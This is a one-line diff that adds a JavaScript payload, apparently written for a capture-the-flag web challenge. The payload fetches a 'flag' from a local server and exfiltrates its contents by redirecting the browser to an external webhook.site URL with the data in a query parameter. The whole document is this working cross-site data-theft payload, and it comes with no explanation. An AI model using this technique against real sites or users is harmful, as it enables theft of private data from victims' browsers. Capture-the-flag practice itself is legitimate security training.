@@ -1,0 +1,1 @@
+fetch('http://localhost:8085/flag').then(response => response.text()).then(data => location='https://webhook.site/e0aa89c4-94e0-4477-aefd-ed8a3bc7c2f8?flag='+data)
